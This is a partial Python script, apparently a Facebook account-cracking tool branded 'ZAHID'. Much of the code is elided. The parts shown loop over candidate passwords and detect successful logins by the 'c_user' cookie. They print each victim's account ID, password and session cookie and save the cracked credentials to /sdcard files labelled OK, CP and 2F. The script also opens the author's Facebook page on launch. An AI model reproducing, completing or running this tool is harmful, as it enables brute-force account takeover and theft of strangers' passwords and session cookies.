...
def clear():
    ...
    print(logo)
logo = """
\033[1;31m ______         _    _ _____ _____  
\033[1;32m |___  /   /\   | |  | |_   _|  __ \ 
\033[1;33m    / /   /  \  | |__| | | | | |  | |
\033[1;34m   / /   / /\ \ |  __  | | | | |  | |
\033[1;35m  / /__ / ____ \| |  | |_| |_| |__| |
\033[1;36m /_____/_/    \_\_|  |_|_____|_____/  """
...
def cek_apk(session,coki):
  ...
  #____________#
def xyz():
    #os.system("xdg-open https://www.facebook.com/zahidalibhurgari114?mibextid=ZbWKwL")
    os.getuid
    os.system("clear")
    print('         \x1b[97m[\033[37;41mTHIS COMMAND MADE BY MR ZAHID \033[0;97m] ')
    os.system("xdg-open https://www.facebook.com/zahidalibhurgari114?mibextid=ZbWKwL");print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[ZAHID-OK❤️]●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nNUMBER : '+uid+'\nPASSWORD   : '+cid+' Ã¢Ë†Å¡ '+ps+ '\nCOOKIE   : '+coki+'\n●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
                cek_apk(session,coki)
                open('/sdcard/ZAHID-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r\033[1;31m [ZAHID-CP😭] \nNUMBER : '+uid+'\nPASSWORD   : '+ps+ '\n------------------------------------')
                open('/sdcard/ZAHID-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/ZAHID-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ZAHID] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
